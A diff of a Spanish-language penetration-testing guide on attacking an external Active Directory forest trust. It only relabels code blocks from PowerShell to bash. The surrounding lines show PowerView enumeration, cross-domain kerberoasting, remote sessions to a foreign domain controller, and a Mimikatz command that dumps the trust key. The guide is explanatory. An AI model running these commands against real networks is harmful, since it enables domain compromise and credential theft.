@@ -7,7 +7,7 @@ En este escenario, un dominio externo te está confiando (o ambos se están conf
 ## Enumeración
 
 Primero que nada, necesitas **enumerar** la **confianza**:
-```powershell
+```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
 TargetName      : domain.external  --> Destination domain
@@ -63,7 +63,7 @@ En la enumeración anterior se encontró que el usuario **`crossuser`** está de
 Si **no pudiste** encontrar ningún acceso **especial** de tu usuario en el otro dominio, aún puedes volver a la Metodología de AD y tratar de **privesc desde un usuario no privilegiado** (cosas como kerberoasting, por ejemplo):
 
 Puedes usar las **funciones de Powerview** para **enumerar** el **otro dominio** usando el parámetro `-Domain` como en:
-```powershell
+```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
 {{#ref}}
@@ -75,7 +75,7 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ### Inicio de sesión
 
 Usando un método regular con las credenciales de los usuarios que tienen acceso al dominio externo, deberías poder acceder a:
-```powershell
+```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 ### Abuso de SID History
@@ -87,7 +87,7 @@ Si un usuario es migrado **de un bosque a otro** y **el filtrado de SID no está
 > [!WARNING]
 > Como recordatorio, puedes obtener la clave de firma con
 >
-> ```powershell
+> ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
